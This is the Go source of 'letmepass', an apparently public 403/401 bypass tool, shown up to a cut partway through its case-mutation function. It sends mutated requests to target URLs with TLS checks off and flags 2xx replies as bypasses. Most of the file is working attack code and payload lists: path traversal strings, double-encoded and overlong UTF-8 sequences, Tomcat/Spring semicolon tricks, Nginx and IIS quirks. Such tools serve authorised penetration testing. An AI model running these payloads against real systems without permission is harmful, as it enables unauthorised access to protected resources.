package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ── ANSI colors ───────────────────────────────────────────────────────────────
const (
	cReset  = "\033[0m"
	cBold   = "\033[1m"
	cRed    = "\033[31m"
	cGreen  = "\033[32m"
	cYellow = "\033[33m"
	cBlue   = "\033[34m"
	cPurple = "\033[35m"
	cCyan   = "\033[36m"
	cOrange = "\033[38;5;208m"
	cGray   = "\033[90m"
	cBGreen = "\033[1;32m"
	cBCyan  = "\033[1;36m"
	cBRed   = "\033[1;31m"
	cBYell  = "\033[1;33m"
)

// ── Techniques ────────────────────────────────────────────────────────────────
const (
	DDS     = "dds"
	ENC     = "enc"
	QUICK   = "quick"
	CASE    = "case"
	HEADRS  = "headers"
	REWRITE = "rewrite"
	METHOD  = "method"
	RICH    = "rich"
	HEX     = "hex"
	TPL     = "tpl"
	UNICODE = "unicode"
	CDN     = "cdn"
	COOKIE  = "cookie"
	REFERER = "referer"
	AGENT   = "agent"
	PARAM   = "param"
	BODY    = "body"
	ALL     = "all"
)

// ── Types ─────────────────────────────────────────────────────────────────────
type Response struct {
	URL        string
	StatusCode int
	BodyLength int
	ExtraInfo  string
	Method     string
}

type Payload struct {
	URL          string
	ExtraHeaders map[string]string
	Method       string
	ExtraInfo    string
	Data         string
}

type Config struct {
	URLs        []string
	Techniques  []string
	Headers     []string
	Concurrency int
	Timeout     int
	OutputFile  string
	Verbose     bool
	Quiet       bool
	All         bool
	Layer       int
	Full        bool

	RPS     int
	RawFile string
	Scheme  string

	MatchStatus  []int
	FilterStatus []int
}

type multiFlag []string

func (f *multiFlag) String() string { return strings.Join(*f, ", ") }
func (f *multiFlag) Set(v string) error {
	*f = append(*f, v)
	return nil
}

// ── Banner ────────────────────────────────────────────────────────────────────
func printBanner() {
	fmt.Print(cBCyan)
	fmt.Println(`  ██╗     ███████╗████████╗███╗   ███╗███████╗██████╗  █████╗ ███████╗███████╗`)
	fmt.Println(`  ██║     ██╔════╝╚══██╔══╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝`)
	fmt.Println(`  ██║     █████╗     ██║   ██╔████╔██║█████╗  ██████╔╝███████║███████╗███████╗`)
	fmt.Println(`  ██║     ██╔══╝     ██║   ██║╚██╔╝██║██╔══╝  ██╔═══╝ ██╔══██║╚════██║╚════██║`)
	fmt.Println(`  ███████╗███████╗   ██║   ██║ ╚═╝ ██║███████╗██║     ██║  ██║███████║███████║`)
	fmt.Println(`  ╚══════╝╚══════╝   ╚═╝   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝`)
	fmt.Print(cReset)
	fmt.Println(cGray + "                  403 Forbidden Bypass Tool  │  github.com/gilsgil/letmepass" + cReset)
	fmt.Println()
}

// ── Main ──────────────────────────────────────────────────────────────────────
func main() {
	singleURL := flag.String("u", "", "Target URL (or via stdin)")
	technique := flag.String("t", "",
		"Techniques (comma-separated): dds,enc,quick,case,headers,rewrite,method,rich,hex,tpl,unicode,cdn,cookie,referer,agent,param,body,all")
	layer    := flag.Int("l", 0, "Path segment layer (1-index, 0=last)")
	fullFlag := flag.Bool("full", false, "Mutate all path segments")

	var headers multiFlag
	flag.Var(&headers, "H", "Extra header 'Name: Value' (repeatable)")

	concurrency := flag.Int("c", 25, "Concurrency")
	timeout     := flag.Int("timeout", 10, "Timeout (s)")
	output      := flag.String("o", "", "Output file")
	verbose     := flag.Bool("v", false, "Print all results live")
	quiet       := flag.Bool("q", false, "Only show bypasses and interesting results")
	allFlag     := flag.Bool("all", false, "Skip initial 401/403 filter")
	methodFlag  := flag.String("X", "", "HTTP method override")
	dataFlag    := flag.String("d", "", "Request body")
	rps         := flag.Int("rps", 0, "Rate limit in requests/sec (0 = unlimited)")
	rawFile     := flag.String("r", "", "Raw HTTP request file (* = injection point)")
	scheme      := flag.String("scheme", "https", "Scheme for -r mode (http/https)")
	matchSt     := flag.String("ms", "", "Only show these status codes (comma-separated, e.g. 200,302)")
	filterSt    := flag.String("fs", "", "Hide these status codes (comma-separated, e.g. 403,404)")

	flag.Parse()
	printBanner()

	cfg := Config{
		Headers:              headers,
		Concurrency:          *concurrency,
		Timeout:              *timeout,
		OutputFile:           *output,
		Verbose:              *verbose,
		Quiet:                *quiet,
		All:                  *allFlag,
		Layer:                *layer,
		Full:                 *fullFlag,
		RPS:          *rps,
		RawFile:      *rawFile,
		Scheme:       *scheme,
		MatchStatus:  parseIntList(*matchSt),
		FilterStatus: parseIntList(*filterSt),
	}

	if *technique == "" {
		cfg.Techniques = []string{
			DDS, ENC, QUICK, CASE, HEADRS, REWRITE, METHOD, UNICODE, CDN, COOKIE, REFERER, AGENT, PARAM, BODY,
		}
	} else if strings.EqualFold(*technique, ALL) {
		cfg.Techniques = []string{
			DDS, ENC, QUICK, CASE, HEADRS, REWRITE, METHOD, RICH, HEX, TPL, UNICODE, CDN, COOKIE, REFERER, AGENT, PARAM, BODY,
		}
	} else {
		cfg.Techniques = strings.Split(*technique, ",")
	}

	var urls []string
	if cfg.RawFile == "" {
		if *singleURL != "" {
			urls = append(urls, *singleURL)
		} else {
			sc := bufio.NewScanner(os.Stdin)
			for sc.Scan() {
				if line := strings.TrimSpace(sc.Text()); line != "" {
					urls = append(urls, line)
				}
			}
		}
		if len(urls) == 0 {
			fmt.Fprintln(os.Stderr, cBRed+"[!] No URLs provided. Use -u, pipe via stdin, or -r for raw request file."+cReset)
			os.Exit(1)
		}
		cfg.URLs = urls
	}

	var toTest      []string
	var allPayloads []Payload

	if cfg.RawFile != "" {
		rr, err := parseRawRequest(cfg.RawFile, cfg.Scheme)
		if err != nil {
			fmt.Fprintf(os.Stderr, cBRed+"[!] Error parsing raw request: %v\n"+cReset, err)
			os.Exit(1)
		}
		cfg.URLs = []string{rr.BaseURL()}
		toTest = filterByInitialCheck(cfg)
		allPayloads = buildFromRawRequest(rr, cfg)
	} else {
		toTest = filterByInitialCheck(cfg)
		allPayloads = buildAllRequests(cfg, toTest)
	}

	for i := range allPayloads {
		if *methodFlag != "" {
			allPayloads[i].Method = *methodFlag
		}
		if *dataFlag != "" {
			allPayloads[i].Data = *dataFlag
		}
	}

	fmt.Fprintf(os.Stderr, cBCyan+"[*]"+cReset+" Targets: %s%d%s  │  Techniques: %s%s%s  │  Payloads: %s%d%s  │  Concurrency: %s%d%s\n\n",
		cBold, len(toTest), cReset,
		cYellow, strings.Join(cfg.Techniques, ","), cReset,
		cBold, len(allPayloads), cReset,
		cBold, cfg.Concurrency, cReset,
	)

	results := runTests(allPayloads, cfg)
	printAllResults(results, cfg)
}

func parseIntList(s string) []int {
	if s == "" {
		return nil
	}
	var out []int
	for _, p := range strings.Split(s, ",") {
		if n, err := strconv.Atoi(strings.TrimSpace(p)); err == nil {
			out = append(out, n)
		}
	}
	return out
}

// ── Filter ────────────────────────────────────────────────────────────────────
func filterByInitialCheck(cfg Config) []string {
	if cfg.All {
		return cfg.URLs
	}
	client := &http.Client{
		Timeout: time.Duration(cfg.Timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var keep []string
	for _, raw := range cfg.URLs {
		resp, err := client.Get(raw)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
			keep = append(keep, raw)
		}
	}
	if len(keep) == 0 {
		return cfg.URLs
	}
	return keep
}

// ── Build requests ────────────────────────────────────────────────────────────
func buildAllRequests(cfg Config, baseURLs []string) []Payload {
	var all []Payload
	for _, base := range baseURLs {
		parsed, err := url.Parse(base)
		if err != nil {
			fmt.Fprintf(os.Stderr, cYellow+"[!] Invalid URL: %s (%v)\n"+cReset, base, err)
			continue
		}
		for _, tech := range cfg.Techniques {
			var ps []Payload
			switch strings.ToLower(tech) {
			case DDS:
				ps = wrapPayloads(generateDDSPayloads(parsed, cfg.Layer, cfg.Full), "dds")
			case ENC:
				ps = wrapPayloads(generateEncodingPayloads(parsed, cfg.Layer, cfg.Full), "enc")
			case QUICK:
				ps = wrapPayloads(generateQuickPayloads(parsed), "quick")
			case CASE:
				ps = wrapPayloads(generateCasePayloads(parsed, cfg.Layer, cfg.Full), "case")
			case HEADRS:
				ps = generateHeadersPayloads(parsed)
			case REWRITE:
				ps = generateRewritePayloads(parsed)
			case METHOD:
				ps = generateMethodPayloads(parsed)
			case RICH:
				ps = wrapPayloads(generateRichBypassPayloads(parsed), "rich")
			case HEX:
				ps = wrapPayloads(generateHexFuzzPayloads(parsed), "hex")
			case TPL:
				ps = wrapPayloads(generateTemplateFuzzPayloads(parsed), "tpl")
			case BODY:
				ps = generateBodyPayloads(parsed)
			case UNICODE:
				ps = wrapPayloads(generateUnicodePayloads(parsed), "unicode")
			case CDN:
				ps = generateCDNPayloads(parsed)
			case COOKIE:
				ps = generateCookiePayloads(parsed)
			case REFERER:
				ps = generateRefererPayloads(parsed)
			case AGENT:
				ps = generateAgentPayloads(parsed)
			case PARAM:
				ps = wrapPayloads(generateParamPayloads(parsed), "param")
			case ALL:
				for _, t := range []string{
					DDS, ENC, QUICK, CASE, HEADRS, REWRITE, METHOD,
					RICH, HEX, TPL, UNICODE, CDN, COOKIE, REFERER, AGENT, PARAM, BODY,
				} {
					sub := buildAllRequests(Config{
						Layer: cfg.Layer, Full: cfg.Full, Techniques: []string{t},
					}, []string{base})
					ps = append(ps, sub...)
				}
			}
			all = append(all, ps...)
		}
	}
	return removeDuplicatePayloads(all)
}

func wrapPayloads(urls []string, tag string) []Payload {
	out := make([]Payload, 0, len(urls))
	for _, u := range urls {
		out = append(out, Payload{
			URL:          u,
			ExtraHeaders: map[string]string{},
			Method:       "GET",
			ExtraInfo:    tag,
		})
	}
	return out
}

func removeDuplicatePayloads(pls []Payload) []Payload {
	seen := make(map[string]struct{}, len(pls)*2)
	out  := make([]Payload, 0, len(pls))
	for _, p := range pls {
		key := p.Method + "|" + p.URL + "|" + p.ExtraInfo + "|" + headersKey(p.ExtraHeaders)
		if _, ok := seen[key]; !ok {
			seen[key] = struct{}{}
			out = append(out, p)
		}
	}
	return out
}

func headersKey(h map[string]string) string {
	if len(h) == 0 {
		return ""
	}
	keys := make([]string, 0, len(h))
	for k := range h {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var sb strings.Builder
	for _, k := range keys {
		sb.WriteString(k + "=" + h[k] + ";")
	}
	return sb.String()
}

// ── Run tests ─────────────────────────────────────────────────────────────────
func runTests(payloads []Payload, cfg Config) []Response {
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{
		Transport:     tr,
		Timeout:       time.Duration(cfg.Timeout) * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error { return nil },
	}

	var tested int64
	total := int64(len(payloads))

	// Progress reporter (stderr)
	stopProg := make(chan struct{})
	go func() {
		ticker := time.NewTicker(150 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-stopProg:
				fmt.Fprintf(os.Stderr, "\r\033[K")
				return
			case <-ticker.C:
				n   := atomic.LoadInt64(&tested)
				pct := int64(0)
				if total > 0 {
					pct = n * 100 / total
				}
				bar := progressBar(int(pct), 30)
				fmt.Fprintf(os.Stderr, "\r%s[*]%s %s %s%d%%%s  %d/%d",
					cCyan, cReset, bar, cBold, pct, cReset, n, total)
			}
		}
	}()

	resultsChan := make(chan Response, len(payloads))
	sem         := make(chan struct{}, cfg.Concurrency)
	var wg sync.WaitGroup

	var rateTok <-chan time.Time
	if cfg.RPS > 0 {
		t := time.NewTicker(time.Second / time.Duration(cfg.RPS))
		defer t.Stop()
		rateTok = t.C
	}

	for _, p := range payloads {
		wg.Add(1)
		sem <- struct{}{}
		go func(pl Payload) {
			defer wg.Done()
			defer func() { <-sem }()
			defer atomic.AddInt64(&tested, 1)

			if rateTok != nil {
				<-rateTok
			}

			method := pl.Method
			if method == "" {
				method = "GET"
			}
			var body io.Reader
			if pl.Data != "" {
				body = strings.NewReader(pl.Data)
			}

			req, err := http.NewRequest(method, pl.URL, body)
			if err != nil {
				resultsChan <- Response{URL: pl.URL, ExtraInfo: pl.ExtraInfo, Method: method}
				return
			}

			if pl.Data != "" && req.Header.Get("Content-Type") == "" {
				t := strings.TrimSpace(pl.Data)
				if strings.HasPrefix(t, "{") || strings.HasPrefix(t, "[") {
					req.Header.Set("Content-Type", "application/json")
				} else {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Accept-Language", "en-US,en;q=0.9")
			req.Header.Set("Connection", "keep-alive")

			for _, h := range cfg.Headers {
				parts := strings.SplitN(h, ":", 2)
				if len(parts) == 2 {
					req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
				}
			}
			for k, v := range pl.ExtraHeaders {
				if strings.EqualFold(k, "host") {
					req.Host = v
				} else {
					req.Header.Set(k, v)
				}
			}

			resp, err := client.Do(req)
			if err != nil {
				resultsChan <- Response{URL: pl.URL, ExtraInfo: pl.ExtraInfo, Method: method}
				return
			}
			defer resp.Body.Close()
			b, _ := io.ReadAll(resp.Body)
			resultsChan <- Response{
				URL:        pl.URL,
				StatusCode: resp.StatusCode,
				BodyLength: len(b),
				ExtraInfo:  pl.ExtraInfo,
				Method:     method,
			}
		}(p)
	}

	go func() { wg.Wait(); close(resultsChan) }()

	var results []Response
	if cfg.Verbose {
		w := bufio.NewWriter(os.Stdout)
		for r := range resultsChan {
			results = append(results, r)
			printResponseLine(w, r)
		}
		w.Flush()
	} else {
		for r := range resultsChan {
			results = append(results, r)
		}
	}

	close(stopProg)
	return results
}

func progressBar(pct, width int) string {
	filled := pct * width / 100
	bar := cGreen + strings.Repeat("█", filled) + cGray + strings.Repeat("░", width-filled) + cReset
	return "[" + bar + "]"
}

// ── Output ────────────────────────────────────────────────────────────────────
func printResponseLine(w *bufio.Writer, r Response) {
	status := fmt.Sprintf("[%d]", r.StatusCode)
	if r.StatusCode == 0 {
		status = "[ERR]"
	}
	method := r.Method
	if method == "" {
		method = "GET"
	}
	color := statusColor(r.StatusCode)
	line  := fmt.Sprintf("%s%-6s%s %-8s %-5s %s",
		color, status, cReset,
		fmt.Sprintf("%dB", r.BodyLength),
		method,
		r.URL,
	)
	if r.ExtraInfo != "" {
		line += cGray + "  │  " + r.ExtraInfo + cReset
	}
	w.WriteString(line + "\n")
}

func printAllResults(results []Response, cfg Config) {
	// Apply status filters
	filtered := applyFilters(results, cfg)

	var bypasses    []Response
	var redirects   []Response
	var interesting []Response
	var errors      []Response

	for _, r := range filtered {
		switch {
		case r.StatusCode >= 200 && r.StatusCode < 300:
			bypasses = append(bypasses, r)
		case r.StatusCode >= 300 && r.StatusCode < 400:
			redirects = append(redirects, r)
		case r.StatusCode == 0:
			errors = append(errors, r)
		case r.StatusCode != 403 && r.StatusCode != 401 && r.StatusCode != 404:
			interesting = append(interesting, r)
		}
	}

	var file *os.File
	if cfg.OutputFile != "" {
		var err error
		file, err = os.Create(cfg.OutputFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, cBRed+"[!] Cannot create output file: %v\n"+cReset, err)
		} else {
			defer file.Close()
		}
	}

	w := bufio.NewWriter(os.Stdout)
	defer w.Flush()

	// ── Summary ───────────────────────────────────────────────────────────────
	fmt.Fprintln(w)
	fmt.Fprintf(w, cBCyan+"┌──────────────────────────────────────────┐\n"+cReset)
	fmt.Fprintf(w, cBCyan+"│"+cReset+cBold+"           RESULTS SUMMARY                "+cBCyan+"│\n"+cReset)
	fmt.Fprintf(w, cBCyan+"├──────────────────────────────────────────┤\n"+cReset)
	fmt.Fprintf(w, cBCyan+"│"+cReset+"  Total tested : %-6d payloads         "+cBCyan+"│\n"+cReset, len(results))
	fmt.Fprintf(w, cBCyan+"│"+cReset+"  "+cBGreen+"Bypasses (2xx)"+cReset+": %-6d                  "+cBCyan+"│\n"+cReset, len(bypasses))
	fmt.Fprintf(w, cBCyan+"│"+cReset+"  "+cBlue+"Redirects (3xx)"+cReset+": %-5d                  "+cBCyan+"│\n"+cReset, len(redirects))
	fmt.Fprintf(w, cBCyan+"│"+cReset+"  "+cYellow+"Interesting     "+cReset+": %-5d                  "+cBCyan+"│\n"+cReset, len(interesting))
	fmt.Fprintf(w, cBCyan+"│"+cReset+"  "+cGray+"Errors          "+cReset+": %-5d                  "+cBCyan+"│\n"+cReset, len(errors))
	fmt.Fprintf(w, cBCyan+"└──────────────────────────────────────────┘\n"+cReset)

	writeFile(file, fmt.Sprintf("=== SUMMARY: %d tested, %d bypasses, %d redirects, %d interesting ===\n",
		len(results), len(bypasses), len(redirects), len(interesting)))

	// ── Potential Bypasses ────────────────────────────────────────────────────
	if len(bypasses) > 0 {
		hdr := fmt.Sprintf("\n%s[!] POTENTIAL BYPASSES (%d)%s\n", cBGreen+cBold, len(bypasses), cReset)
		sep := cGreen + strings.Repeat("─", 72) + cReset + "\n"
		fmt.Fprint(w, hdr, sep)
		writeFile(file, "\n[!] POTENTIAL BYPASSES\n"+strings.Repeat("-", 72)+"\n")
		for _, r := range bypasses {
			printResponseLine(w, r)
			writeFile(file, responseFileLine(r))
		}
	}

	// ── Redirects ─────────────────────────────────────────────────────────────
	if len(redirects) > 0 {
		hdr := fmt.Sprintf("\n%s[→] REDIRECTS (%d)%s\n", cBlue+cBold, len(redirects), cReset)
		sep := cBlue + strings.Repeat("─", 72) + cReset + "\n"
		fmt.Fprint(w, hdr, sep)
		writeFile(file, "\n[→] REDIRECTS\n"+strings.Repeat("-", 72)+"\n")
		for _, r := range redirects {
			printResponseLine(w, r)
			writeFile(file, responseFileLine(r))
		}
	}

	// ── Interesting ───────────────────────────────────────────────────────────
	if len(interesting) > 0 {
		hdr := fmt.Sprintf("\n%s[*] INTERESTING (%d)%s\n", cBYell+cBold, len(interesting), cReset)
		sep := cYellow + strings.Repeat("─", 72) + cReset + "\n"
		fmt.Fprint(w, hdr, sep)
		writeFile(file, "\n[*] INTERESTING\n"+strings.Repeat("-", 72)+"\n")
		for _, r := range interesting {
			printResponseLine(w, r)
			writeFile(file, responseFileLine(r))
		}
	}

	if cfg.Quiet {
		return
	}

	// ── All results grouped by body length ────────────────────────────────────
	buckets := make(map[int][]Response)
	for _, r := range filtered {
		buckets[r.BodyLength] = append(buckets[r.BodyLength], r)
	}
	lengths := make([]int, 0, len(buckets))
	for l := range buckets {
		lengths = append(lengths, l)
	}
	sort.Slice(lengths, func(i, j int) bool {
		ci, cj := len(buckets[lengths[i]]), len(buckets[lengths[j]])
		if ci != cj {
			return ci > cj
		}
		return lengths[i] < lengths[j]
	})

	fmt.Fprintln(w)
	fmt.Fprintf(w, cBCyan+cBold+"=== ALL RESULTS GROUPED BY BODY LENGTH ==="+cReset+"\n")
	writeFile(file, "\n=== ALL RESULTS GROUPED BY BODY LENGTH ===\n")

	for _, length := range lengths {
		group := buckets[length]
		sort.Slice(group, func(i, j int) bool {
			if group[i].StatusCode != group[j].StatusCode {
				return group[i].StatusCode < group[j].StatusCode
			}
			return group[i].URL < group[j].URL
		})
		title := fmt.Sprintf("\n%s%s=== Length: %d (%d results) ===%s\n",
			cBold, cGray, length, len(group), cReset)
		fmt.Fprint(w, title)
		writeFile(file, fmt.Sprintf("\n=== Length: %d (%d results) ===\n", length, len(group)))
		for _, res := range group {
			printResponseLine(w, res)
			writeFile(file, responseFileLine(res))
		}
	}
}

func applyFilters(results []Response, cfg Config) []Response {
	if len(cfg.MatchStatus) == 0 && len(cfg.FilterStatus) == 0 {
		return results
	}
	var out []Response
	for _, r := range results {
		if len(cfg.MatchStatus) > 0 {
			found := false
			for _, s := range cfg.MatchStatus {
				if r.StatusCode == s {
					found = true
					break
				}
			}
			if !found {
				continue
			}
		}
		if len(cfg.FilterStatus) > 0 {
			skip := false
			for _, s := range cfg.FilterStatus {
				if r.StatusCode == s {
					skip = true
					break
				}
			}
			if skip {
				continue
			}
		}
		out = append(out, r)
	}
	return out
}

func writeFile(f *os.File, s string) {
	if f != nil {
		f.WriteString(s)
	}
}

func responseFileLine(r Response) string {
	line := fmt.Sprintf("[%d] %dB  %s  %s", r.StatusCode, r.BodyLength, r.Method, r.URL)
	if r.ExtraInfo != "" {
		line += "  |  " + r.ExtraInfo
	}
	return line + "\n"
}

func statusColor(code int) string {
	switch {
	case code >= 200 && code < 300:
		return cBGreen
	case code >= 300 && code < 400:
		return cBlue
	case code == 401:
		return cOrange
	case code == 403:
		return cRed
	case code == 404:
		return cPurple
	case code >= 400 && code < 500:
		return cYellow
	case code >= 500 && code < 600:
		return "\033[38;5;94m"
	case code == 0:
		return cGray
	default:
		return ""
	}
}

// ── DDS: Directory/Dot/Slash traversal ───────────────────────────────────────
func generateDDSPayloads(parsedURL *url.URL, layer int, full bool) []string {
	var payloads []string
	path      := strings.TrimPrefix(parsedURL.Path, "/")
	pathParts := strings.Split(path, "/")
	base      := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	variations := []string{
		// Classic
		"../", ".././", "../../", "..//", "..///", "....//", ".../",
		"./", "/..", "/../", "/./",

		// Encoded (single)
		"%2e%2e/", "%2e%2e%2f", "..%2f", "..%2F", ".%2e/", "%2e./",
		"..%5c", "..%5C", "%2e%2e%5c",

		// Double-encoded
		"%252e%252e/", "%252e%252e%252f", "%252e%252e%255c",
		"..%252f", "..%255c", ".%252e/",

		// Overlong UTF-8
		"..%c0%af", "..%c1%9c", "..%c0%9v",
		"%2e%2e%c0%af", "%2e%2e%c1%9c",
		"%252e%252e%c0%af",

		// 3-byte and 4-byte overlong
		"..%e0%80%af", "..%f0%80%80%af",

		// Null/control byte injection
		"..%00/", "..%0d/", "..%0a/", "..%ff/", "..%0d%0a/",
		".%00./", ".%0d./", ".%0a./",

		// Semicolons (Tomcat/Spring)
		"..;/", ".;/", "..;", ";../", ";/",

		// Windows-style
		"..\\", "..\\..\\", "....\\", "..\\.\\",
		"..%5c..%5c", "..%255c..%255c",

		// Unicode/fullwidth
		"%u002e%u002e/", "%u002e%u002e%u002f",
		"%u2215", "%uff0f", "%c0%af",

		// Special chars
		"%252f", "%5c", "%2f", "%3f", "%26", "%23", "%2c", "%7c",
		"%2e%2e%2f%2e%2e%2f", "%2f..%2f..", "%5c..%5c..",
		"/%2e%2e/", "/..//", "/%2e./",

		// Spring Boot / Nginx
		"/..;/", "/../;/", "/..//",

		// Misc
		"..%2e/", ".%2f./", "..\\.\\",
		"%2f%2e%2e%2f", "/%252e%252e/",
	}

	applyVar := func(base, cur, v string, mod []string, target int) {
		payloads = append(payloads, fmt.Sprintf("%s/%s%s", base, cur, v))
		m2 := append([]string{}, mod...)
		m2[target] = v + m2[target]
		payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(m2, "/")))
	}

	if full {
		for i := 0; i < len(pathParts); i++ {
			cur := strings.Join(pathParts[:i+1], "/")
			mod := append([]string{}, pathParts[:i+1]...)
			for _, v := range variations {
				applyVar(base, cur, v, mod, i)
			}
		}
		for _, v := range variations {
			for i := 1; i < len(pathParts); i++ {
				mod := append([]string{}, pathParts...)
				mod[i] = v + mod[i]
				payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
			}
		}
		payloads = append(payloads, prefixSemicolons(base, pathParts)...)
	} else {
		target := len(pathParts) - 1
		if layer > 0 && layer <= len(pathParts) {
			target = layer - 1
		}
		cur := strings.Join(pathParts[:target+1], "/")
		mod := append([]string{}, pathParts[:target+1]...)
		for _, v := range variations {
			applyVar(base, cur, v, mod, target)
		}
		payloads = append(payloads, prefixSemicolons(base, pathParts)...)
	}

	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] += "?" + parsedURL.RawQuery
		}
	}
	return payloads
}

func prefixSemicolons(base string, parts []string) []string {
	var out []string
	out = append(out, joinBase(base, generateSemicolonCombinations(parts))...)
	if len(parts) >= 2 {
		out = append(out, joinBase(base, generateMultipleSemicolonPatterns(parts))...)
	}
	return out
}

// ── ENC: Encoding variations ──────────────────────────────────────────────────
func generateEncodingPayloads(parsedURL *url.URL, layer int, full bool) []string {
	var payloads []string
	path      := strings.TrimPrefix(parsedURL.Path, "/")
	pathParts := strings.Split(path, "/")
	base      := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	encodedPath      := url.PathEscape(path)
	doubleEncoded    := url.PathEscape(encodedPath)
	b64Std           := base64.StdEncoding.EncodeToString([]byte(path))
	b64URL           := base64.URLEncoding.EncodeToString([]byte(path))
	payloads = append(payloads,
		fmt.Sprintf("%s/%s", base, encodedPath),
		fmt.Sprintf("%s/%s", base, doubleEncoded),
		fmt.Sprintf("%s/%s", base, b64Std),
		fmt.Sprintf("%s/%s", base, b64URL),
	)

	var idxs []int
	if full {
		for i := range pathParts {
			idxs = append(idxs, i)
		}
	} else {
		target := len(pathParts) - 1
		if layer > 0 && layer <= len(pathParts) {
			target = layer - 1
		}
		idxs = []int{target}
	}

	for _, i := range idxs {
		seg := pathParts[i]

		for _, fe := range generateFullEncodings(seg) {
			mod    := append([]string{}, pathParts...)
			mod[i] = fe
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}
		for _, cbc := range percentEncodeCharByChar(seg) {
			mod    := append([]string{}, pathParts...)
			mod[i] = cbc
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}

		// Full segment b64
		for _, enc := range []string{
			base64.StdEncoding.EncodeToString([]byte(seg)),
			base64.URLEncoding.EncodeToString([]byte(seg)),
		} {
			mod    := append([]string{}, pathParts...)
			mod[i] = enc
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}

		// b64 char-by-char
		if seg != "" {
			var pieces []string
			for _, ch := range seg {
				pieces = append(pieces, base64.StdEncoding.EncodeToString([]byte(string(ch))))
			}
			mod    := append([]string{}, pathParts...)
			mod[i] = strings.Join(pieces, "")
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}

		// HTML-entity style hex (%XX for every char)
		if seg != "" {
			var all []byte
			for j := 0; j < len(seg); j++ {
				all = append(all, seg[j])
			}
			var sb strings.Builder
			for _, b := range all {
				fmt.Fprintf(&sb, "%%%02X", b)
			}
			mod    := append([]string{}, pathParts...)
			mod[i] = sb.String()
			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
		}
	}

	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] += "?" + parsedURL.RawQuery
		}
	}
	return payloads
}

// ── QUICK: Path prefix/suffix tricks ─────────────────────────────────────────
func generateQuickPayloads(parsedURL *url.URL) []string {
	var payloads []string
	path := strings.TrimPrefix(parsedURL.Path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	quick := []string{
		// Double/triple slash prefix
		"//" + path, "///" + path, "////" + path,
		"/./" + path, "/.///" + path, "/.%2f" + path,

		// Semicolon tricks (Tomcat/Spring)
		"/;/" + path, "/.;/" + path, "//;" + path,
		"/;param=x/" + path, "/" + path + ";", "/" + path + ";/",
		"/" + path + "/;/", "/" + path + "//;/", "/" + path + "/./;/",
		"/;/" + path, "/;invalid=x/" + path,

		// Spring Boot ..;/ bypass
		"/..;/" + path, "/" + path + "/..;/", "/../;/" + path,
		"/" + path + "/../", "/" + path + "/./",

		// Nginx off-by-slash / normalization
		"/" + path + "../", "/" + path + "./",
		"/" + path + "%20", "/" + path + "%09",
		"/" + path + "%00", "/" + path + "%0d%0a",
		"/" + path + "~", "/" + path + "%7e",

		// Path parameter tricks
		"/%2f/" + path, "/%2f%2f/" + path, "/%2f;" + path,
		"/%3b/" + path, "/%23/" + path,
		"/%2e/" + path, "/%2e%2e/" + path,
		"/%252e/" + path, "/%252e%252e/" + path,

		// Suffix tricks
		"/" + path + "//", "/" + path + "/.",
		"//" + path + "//",
		"/" + path + "%20/", "/" + path + "%09/",
		"/" + path + "?",
		"/" + path + "#",
		"/" + path + "/*",
		"/" + path + "/index",
		"/" + path + "/index.html",
		"/" + path + "/.json",
		"/" + path + "/.xml",

		// Traversal prefix
		"/..%2f" + path, "/%2f..%2f" + path,
		"/%2e%2e/" + path, "/../" + path,

		// IIS tricks
		"/" + path + "::$DATA",
		"/" + path + "/.",

		// Misc traversal
		"/" + path + "/..;/",
	}

	for _, p := range quick {
		payloads = append(payloads, base+p)
	}
	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] += "?" + parsedURL.RawQuery
		}
	}
	return payloads
}

// ── CASE: Case manipulation ───────────────────────────────────────────────────
func generateCasePayloads(parsedURL *url.URL, layer int, full bool) []string {
	var payloads []string
	path  := strings.TrimPrefix(parsedURL.Path, "/")
	parts := strings.Split(path, "/")
	base  := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	var idxs []int
	if full {
		for i := range parts {
			idxs = append(idxs, i)
		}
	} else {
		target := len(parts) - 1
		if layer > 0 && layer <= len(parts) {
			target = layer - 1
		}
		idxs = []int{target}
	}

	for _, i := range idxs {
		if parts[i] == "" {
			continue
		}
		seg := parts[i]
		variations := []string{
			strings.ToUpper(seg),
			strings.ToLower(seg),
			toTitleCase(seg),
		}
		if len(seg) > 1 {
			variations = append(variations,
				strings.ToUpper(seg[:1])+seg[1:],
				strings.ToLower(seg[:1])+seg[1:],
			)
		}
		// Alternating case
		mixed := make([]byte, len(seg))
